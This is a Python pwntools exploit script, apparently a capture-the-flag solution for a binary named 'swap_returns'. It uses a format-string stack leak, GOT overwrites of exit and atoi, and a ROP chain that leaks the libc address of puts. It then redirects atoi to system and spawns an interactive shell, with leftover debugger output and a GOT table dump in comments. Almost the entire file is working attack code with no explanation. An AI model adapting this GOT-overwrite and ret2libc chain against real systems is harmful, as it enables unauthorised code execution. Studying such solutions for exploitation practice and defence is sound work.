#! /usr/bin/python
from pwn import *

def Set(addr1, addr2):
	r.sendlineafter('Your choice: \n', '1')
	r.sendlineafter('1st address: \n', str(addr1))
	r.sendlineafter('2nd address: \n', str(addr2))


r = process('./swap_returns', env={'LD_PRELOAD':'./libc.so.6'})
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x0000040090A')
libc = ELF('./libc.so.6')

printf_addr = 0x601038
atoi_addr = 0x601050
Set(printf_addr, atoi_addr)

r.sendlineafter('Your choice: \n', '5')
r.sendlineafter('Your choice: \n', '2') # swap
r.sendlineafter('Your choice: \n', '%p')

leak = r.recvuntil('1. Set')
leak = int(leak[:leak.find('1. Set')],16)
success('stack leak = '+hex(leak))
rbp = leak+74
A_addr = rbp-0x20
B_addr = rbp-0x18
log.info('main rbp address = '+hex(rbp))
log.info('stack A address = '+hex(A_addr))
log.info('stack B address = '+hex(B_addr))


r.sendlineafter('1st address: \n', str(printf_addr))
r.sendlineafter('2nd address: \n', str(atoi_addr))
r.sendlineafter('Your choice: \n', '2') # swap


''' find main address in stack
pwndbg> search -x e90840
swap_returns    0x400720 jmp    0xffffffffff40472d
swap_returns    0x600720 0x8c615ff004008e9
warning: Unable to access 16000 bytes of target memory at 0x7f2a34c76d02, halting search.
[stack]         0x7ffce0ccae08 0x4008e9
'''
exit_addr = 0x601018
stack_main_addr = rbp+40
Set(exit_addr, stack_main_addr) # exit() -> return main()
r.sendlineafter('Your choice: \n', '2') # swap


'''
0x00000000004008e7 : leave ; ret
0x0000000000400a53 : pop rdi ; ret
'''

#### save gadget in stack ####
start_main = 0x4008e9 # rbp-0x20
leaveret = 0x0004008e7 # rbp-0x18
Set(start_main, leaveret)
r.sendlineafter('Your choice: \n', '3') # return main()


popret = 0x000400a53  # rbp-0x60
leaveret = 0x0004008e7 # rbp-0x58
Set(popret, leaveret) # save gadget in stack 
r.sendlineafter('Your choice: \n', '3') # return main()


puts_plt = 0x004006A0 # rbp-0xa0
puts_got = 0x601028 # rbp-0x98
Set(puts_plt, puts_got)
r.sendlineafter('Your choice: \n', '3') # return main()



#### save 0x4008e9 in bss ####
bss_addr = 0x601d00
Set(exit_addr, bss_addr)
r.sendlineafter('Your choice: \n', '2') # swap


#### pop ret; puts@got.plt; puts@plt; main(); ####
chunk1_rip = rbp-0xb8
Set(chunk1_rip, rbp-0x60) # pop ret;
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x8, rbp-0x98) # puts@got
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x10, rbp-0xa0) # puts@plt
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x18, bss_addr) # start_main
r.sendlineafter('Your choice: \n', '2') # swap


#### exit() -> leave; ret; ####
Set(rbp-0x58, exit_addr) # leave; ret;
r.sendlineafter('Your choice: \n', '2') # swap


#### leak libc ####
r.sendlineafter('Your choice: \n', '3') # call rop chain1
r.recvuntil('Bye. ')
leak = u64(r.recv(6).ljust(8,'\x00'))
success('libc leak = '+hex(leak))
libc_base = leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
#binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('libc_base = '+hex(libc_base))
log.info('system_addr = '+hex(system_addr))


#### save system_addr in stack ####
Set(exit_addr, rbp-0x20) # start_main = 0x4008e9 # rbp-0x20
r.sendlineafter('Your choice: \n', '2') # swap

Set(system_addr, 0xaaaaaa) # rbp-0xc0, rbp-0xb8
r.sendlineafter('Your choice: \n', '3') # return main()


#### atoi() -> system() ####
Set(rbp-0xc0, atoi_addr)
r.sendlineafter('Your choice: \n', '2') # swap

r.sendlineafter('Your choice: \n', 'sh') # system("sh")
r.interactive()

'''
.got.plt:0x601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0x601008 qword_601008    dq 0                    
.got.plt:0x601010 ; __int64 (*qword_601010)(void)
.got.plt:0x601010 qword_601010    dq 0                    
.got.plt:0x601018 off_601018      dq offset _exit         
6295576
.got.plt:0x601020 off_601020      dq offset __isoc99_fscanf
.got.plt:0x601020                                         
6295584
.got.plt:0x601028 off_601028      dq offset puts          
6295592
.got.plt:0x601030 off_601030      dq offset __stack_chk_fail
.got.plt:0x601030                                         
.got.plt:0x601038 off_601038      dq offset printf        
6295608
.got.plt:0x601040 off_601040      dq offset read          
6295616
.got.plt:0x601048 off_601048      dq offset setvbuf       
.got.plt:0x601050 off_601050      dq offset atoi          
6295632
'''